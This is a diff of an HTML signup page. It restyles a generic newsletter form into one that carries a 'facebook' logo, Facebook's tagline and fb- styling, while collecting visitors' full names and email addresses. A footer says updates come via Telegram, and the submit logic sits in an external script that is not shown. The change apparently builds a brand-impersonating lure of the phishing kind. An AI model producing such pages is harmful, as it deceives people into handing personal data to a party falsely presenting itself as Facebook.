@@ -3,41 +3,35 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Get in touch</title>
+  <title>Connect</title>
   <link rel="stylesheet" href="/styles.css" />
 </head>
 <body>
-  <main class="page">
-    <div class="card">
-      <div class="brand">
-        <h1>Connect</h1>
+  <div class="fb-wrapper">
+    <div class="fb-content">
+      <div class="fb-left">
+        <h1 class="fb-logo">facebook</h1>
+        <p class="fb-tagline">Connect with friends and the world around you.</p>
       </div>
+      <div class="fb-right">
+        <div class="fb-card">
+          <form id="leadForm" autocomplete="off">
+            <input id="name" name="name" type="text" placeholder="Full name" required />
+            <input id="email" name="email" type="email" placeholder="Email address" required />
 
-      <form id="leadForm" class="form" autocomplete="off">
-        <h2>Join our list</h2>
-        <p class="sub">Leave your name & email — we'll send updates via Telegram.</p>
+            <!-- Honeypot -->
+            <input id="hp" name="hp" type="text" aria-hidden="true" tabindex="-1" autocomplete="off" />
 
-        <label class="field">
-          <input id="name" name="name" type="text" placeholder="Full name" required />
-        </label>
-
-        <label class="field">
-          <input id="email" name="email" type="email" placeholder="Email address" required />
-        </label>
-
-
-        <!-- Honeypot field - hidden from humans & autofill -->
-<input id="hp" name="hp" type="text" aria-hidden="true" tabindex="-1" autocomplete="off" />
-
-
-
-        <button id="submitBtn" class="btn" type="submit">Get started</button>
-
-        <p id="status" class="status" role="status" aria-live="polite"></p>
-      </form>
+            <button id="submitBtn" type="submit">Get Started</button>
+            <p id="status" class="status" role="status" aria-live="polite"></p>
+          </form>
+        </div>
+        <p class="fb-footer-text">
+          By joining, you'll receive updates via Telegram.
+        </p>
+      </div>
     </div>
-  </main>
-
+  </div>
   <script src="/script.js"></script>
 </body>
 </html>
